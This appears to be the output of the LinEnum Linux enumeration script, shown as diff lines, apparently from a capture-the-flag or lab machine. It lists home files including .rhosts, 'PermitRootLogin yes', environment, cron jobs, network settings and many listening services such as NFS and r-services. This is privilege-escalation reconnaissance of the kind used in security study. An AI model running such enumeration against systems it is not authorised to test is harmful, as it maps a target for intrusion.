+-rw-r--r-- 1 user user 0 Sep  2  2012 /home/user/.cache/motd.legal-displayed
+-rw-r--r-- 1 user user 220 Sep  2  2012 /home/user/.bash_logout
+-rw-r--r-- 1 user user 675 Sep  2  2012 /home/user/.profile
+-rwxrwxr-x 1 user user 65666 Jul 15  2018 /home/user/Linux-exploit-suggester.sh
+-rw-r--r-- 1 user user 3486 Sep  2  2012 /home/user/.bashrc
+-rwxrwxr-x 1 user user 44413 Jul 15  2018 /home/user/LinEnum.sh
+
+
+[-] Home directory contents:
+total 144K
+drwxr-x--- 3 user user 4.0K Mar  3 00:12 .
+drwxr-xr-x 4 root root 4.0K Sep  2  2012 ..
+-rw------- 1 user user   28 Mar  2 23:43 .bash_history
+-rw-r--r-- 1 user user  220 Sep  2  2012 .bash_logout
+-rw-r--r-- 1 user user 3.5K Sep  2  2012 .bashrc
+drwx------ 2 user user 4.0K Sep  2  2012 .cache
+-rwxrwxr-x 1 user user  44K Jul 15  2018 LinEnum.sh
+-rwxrwxr-x 1 user user  65K Jul 15  2018 Linux-exploit-suggester.sh
+-rw-r--r-- 1 user user  675 Sep  2  2012 .profile
+-rw------- 1 user user    7 Sep  2  2012 .rhosts
+
+
+[-] Root is allowed to login via SSH:
+PermitRootLogin yes
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+SHELL=/bin/bash
+TERM=xterm-256color
+SSH_CLIENT=192.168.1.8 60816 22
+SSH_TTY=/dev/pts/0
+USER=user
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+MAIL=/var/mail/user
+PWD=/home/user
+LANG=en_GB.UTF-8
+HOME=/home/user
+SHLVL=2
+LANGUAGE=en_GB:en
+LOGNAME=user
+SSH_CONNECTION=192.168.1.8 60816 192.168.1.37 22
+LESSOPEN=| /usr/bin/lesspipe %s
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+
+
+[-] Path information:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/tmux
+/usr/bin/screen
+
+
+[-] Current umask value:
+0002
+u=rwx,g=rwx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK		022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
+
+/etc/cron.d:
+total 12
+drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+drwxr-xr-x 91 root root 4096 Mar  2 21:00 ..
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+/etc/cron.daily:
+total 72
+drwxr-xr-x  2 root root  4096 Sep  2  2012 .
+drwxr-xr-x 91 root root  4096 Mar  2 21:00 ..
+-rwxr-xr-x  1 root root   219 Apr 10  2012 apport
+-rwxr-xr-x  1 root root 15399 Jun 15  2012 apt
+-rwxr-xr-x  1 root root   314 Mar 30  2012 aptitude
+-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+-rwxr-xr-x  1 root root   256 Apr 13  2012 dpkg
+-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+-rwxr-xr-x  1 root root  1365 Mar 31  2012 man-db
+-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+-rwxr-xr-x  1 root root   249 Apr  9  2012 passwd
+-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
+-rwxr-xr-x  1 root root   214 Aug  9  2012 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+drwxr-xr-x 91 root root 4096 Mar  2 21:00 ..
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+drwxr-xr-x 91 root root 4096 Mar  2 21:00 ..
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+drwxr-xr-x 91 root root 4096 Mar  2 21:00 ..
+-rwxr-xr-x  1 root root  730 Dec 31  2011 apt-xapian-index
+-rwxr-xr-x  1 root root  907 Mar 31  2012 man-db
+-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
+
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0      Link encap:Ethernet  HWaddr 08:00:27:8b:ea:be  
+          inet addr:192.168.1.37  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe8b:eabe/64 Scope:Global
+          inet6 addr: fe80::a00:27ff:fe8b:eabe/64 Scope:Link
+          inet6 addr: 2a01:e35:2fef:d7e0:84c0:3dd5:4c25:f851/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2392647 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2339830 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:196036356 (196.0 MB)  TX bytes:188662828 (188.6 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:8 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:532 (532.0 B)  TX bytes:532 (532.0 B)
+
+
+[-] ARP history:
+? (192.168.1.8) at 08:00:27:ca:e8:b7 [ether] on eth0
+? (192.168.1.254) at 68:a3:78:8b:0c:dd [ether] on eth0
+
+
+[-] Nameserver(s):
+nameserver 192.168.1.254
+
+
+[-] Default route:
+default         192.168.1.254   0.0.0.0         UG    100    0        0 eth0
+
+
+[-] Listening TCP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:56364           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:50352           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:37168           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:59900           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:42151           0.0.0.0:*               LISTEN      -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38222       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38076       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38200       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38188       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38172       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38018       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38212       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38310       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38332       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38280       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38370       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38106       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38066       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38020       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38234       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38080       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38112       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38024       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38068       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38418       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38336       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38338       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38184       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38014       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38278       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38328       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38056       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38086       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38034       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38284       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38098       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38144       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37960       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38242       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38208       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38182       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38256       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38250       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38156       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38382       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38390       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38010       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38348       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38342       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38046       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38254       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38354       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38412       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38150       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38132       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38334       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38082       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38282       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:60816       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38402       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38030       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38300       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38232       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38448       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38038       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38158       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38162       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38262       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38318       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38398       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38194       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38210       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38442       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38022       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38456       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37950       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38118       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38368       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38146       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38224       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38134       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38042       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37996       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38248       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37986       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38050       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38028       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38454       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38104       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38114       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38160       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38130       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38126       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38470       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:2049       192.168.1.8:972         ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38436       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38236       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38290       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38100       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37958       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38196       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38070       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38312       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38376       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38142       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38198       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38406       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38366       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38344       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38040       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38392       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38128       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38330       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38110       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38226       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38094       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38116       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38074       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38270       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38422       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38204       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38346       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38468       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38096       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38090       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38088       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38464       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38408       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38178       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38396       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38124       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38326       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38230       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38432       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38108       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38174       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38120       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38244       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38266       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38356       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38388       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38404       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37956       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38166       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38420       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38444       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38216       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38238       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38416       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38394       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38322       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38206       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38190       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38460       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38414       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38324       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38296       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38426       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38286       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38032       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38084       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38428       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38462       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37994       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38148       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38446       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38340       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38302       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38258       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38466       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38054       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38140       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38122       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38272       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38136       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38036       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38384       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38060       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38304       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38192       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38424       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38306       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38240       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38452       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38214       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38316       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38314       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38378       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38260       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38026       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38294       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37954       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38386       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37988       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38298       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:37952       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38252       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38450       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38268       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38440       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38228       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38372       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38364       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38434       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38218       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38048       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38360       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38288       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38044       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38410       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38012       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38102       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38092       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38292       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38058       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38164       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38180       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38062       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38352       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38374       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38220       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38064       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38052       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38168       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38308       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38202       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38362       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38350       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38072       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38430       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38154       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38264       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38246       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38458       ESTABLISHED -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38438       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38138       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38170       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38186       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38016       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38176       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38276       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38380       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38274       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38320       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38078       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38358       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38152       TIME_WAIT   -               
+tcp        0      0 192.168.1.37:22         192.168.1.8:38400       TIME_WAIT   -               
+tcp6       0      0 :::51405                :::*                    LISTEN      -               
+tcp6       0      0 :::110                  :::*                    LISTEN      -               
+tcp6       0      0 :::143                  :::*                    LISTEN      -               
+tcp6       0      0 :::111                  :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 :::25                   :::*                    LISTEN      -               
+tcp6       0      0 :::54715                :::*                    LISTEN      -               
+tcp6       0      0 :::40381                :::*                    LISTEN      -               
+tcp6       0      0 :::2049                 :::*                    LISTEN      -               
+tcp6       0      0 :::993                  :::*                    LISTEN      -               
+tcp6       0      0 :::995                  :::*                    LISTEN      -               
+tcp6       0      0 :::44101                :::*                    LISTEN      -               
+tcp6       0      0 :::49639                :::*                    LISTEN      -               
+
+
+[-] Listening UDP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+udp        0      0 127.0.0.1:941           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:34746           0.0.0.0:*                           -               
